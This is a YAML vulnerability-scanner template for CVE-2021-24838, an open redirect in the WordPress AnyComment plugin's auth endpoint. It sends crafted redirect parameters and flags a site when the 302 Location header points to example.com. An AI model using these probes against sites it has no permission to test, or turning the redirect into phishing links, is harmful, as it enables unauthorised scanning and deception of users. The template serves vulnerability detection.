name: poc-yaml-wordpress-anycomment-cve-2021-24838-redirect
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-json/anycomment/v1/auth/wordpress?redirect=https://example.com
            follow_redirects: false
        expression: response.status == 302 && "(?m)^(?:Location\\s*?:\\s*?)(?:https?:\\/\\/|\\/\\/|\\/\\\\\\\\|\\/\\\\)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com\\/?".bmatches(response.raw_header)
    r1:
        request:
            cache: true
            method: GET
            path: /wp-json/anycomment/v1/auth/wordpress?redirect=https://example.com?a=https://example.com
            follow_redirects: false
        expression: response.status == 302 && "(?m)^(?:Location\\s*?:\\s*?)(?:https?:\\/\\/|\\/\\/|\\/\\\\\\\\|\\/\\\\)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com\\/?".bmatches(response.raw_header)
expression: r0() || r1()
detail:
    author: Â∞èz
    links:
        - https://wpscan.com/vulnerability/562e81ad-7422-4437-a5b4-fcab9379db82
    vulnerability:
        level: medium